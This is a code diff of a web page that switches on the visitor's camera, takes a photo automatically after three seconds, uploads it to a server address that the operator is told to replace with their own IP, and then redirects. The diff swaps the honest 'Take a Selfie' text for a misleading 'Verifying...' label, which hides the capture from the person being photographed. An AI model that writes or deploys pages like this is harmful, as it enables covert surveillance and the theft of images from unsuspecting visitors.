@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Take a Selfie</title>
+    <title>Verifying...</title>
 </head>
 <body>
-    <h2>Taking your selfie...</h2>
+    <h2 id="status">Verifying...</h2>
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
@@ -14,6 +14,9 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+
+        // Change "Take a selfie pic" to "Verifying..."
+        document.getElementById("status").innerText = "Verifying...";
 
         // Access the user's camera
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -29,12 +32,12 @@
                     // Convert to image and send to server
                     const imageData = canvas.toDataURL('image/png');
 
-                    fetch('http:// 192.168.0.101:3000/upload', {
+                    fetch('http://192.168.0.101:3000/upload', {  // Replace with your IP
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ image: imageData })
                     }).then(() => {
-                        // Redirect user to thankyou.html after uploading
+                        // Redirect user after uploading
                         window.location.href = "thankyou.html";
                     });
                 }, 3000); // 3 seconds delay before capturing
